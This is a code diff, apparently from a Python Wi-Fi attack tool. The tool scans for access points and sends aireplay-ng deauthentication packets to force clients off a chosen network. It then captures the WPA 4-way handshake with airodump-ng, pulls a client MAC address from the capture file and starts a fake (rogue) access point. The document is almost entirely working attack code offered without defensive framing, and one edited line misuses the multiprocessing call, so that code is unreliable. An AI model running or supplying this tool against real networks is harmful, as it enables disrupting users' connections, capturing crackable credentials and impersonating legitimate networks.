@@ -3,7 +3,6 @@ from scapy.all import *
 import time
 import os
 import conf_files as cf
-import re
 import pandas as pd
 
 iface = ''
@@ -18,12 +17,13 @@ def mac_extract():
     data = pd.read_csv('handshake-01.csv')
     mac = data.iloc[2][0]
     #print(data)
-    print(mac)
+    #print(mac)
     #gets mac by removing redundant columns
     #first_col = data.iloc[:,0]
     #remove_row = data.iloc[1:,:]
     #remove_row2 = remove_row.iloc[1:,:]
     return mac
+    
 def ap_scanner():
     print("Scanning for access points...")
     print("press CTRL+C to stop the scanning")
@@ -48,16 +48,18 @@ def ap_sniffer(pkt) :
 def deauth(dist):
     os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface}")
 
-def handshake_capture(): #look at fixing handshake capture and spoof mac address of client device once connected to rogue access point??
+def handshake_capture():
         global essid_name, bssid_name, channel_no
         mac_adder = int(input("\nEnter the index of the network you want to target: ")) - 1
-        bssid_name = bssid_list[mac_adder], essid_name = essid_list[mac_adder], channel_no = channel_list[mac_adder]
+        bssid_name = bssid_list[mac_adder]
+        essid_name = essid_list[mac_adder]
+        channel_no = channel_list[mac_adder]
         print("\nNetwork to target:\n")
         print(channel_no,'\t',bssid_name,'\t', essid_name)
         dist = str(input("\nEnter the number of the packets [1-10000] (0 for unlimited number) "))
         print("Capturing 4-Way handshake [{}]...".format(bssid_name))
         #start deauthentication process
-        p_deauth = Process(target = deauth, args=(dist))
+        p_deauth = Process(target = deauth(dist))
         p_deauth.start()
         #os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface} | xterm -e airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
         os.system(f"airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
@@ -120,6 +122,7 @@ def main():
     cc.terminate()
     handshake_capture()
     client_mac = mac_extract()
+    print(client_mac)
     disable_monitor(iface)
     print("Fake Access Point\nWhen Done Press CTRL+C")
     time.sleep(2.0)
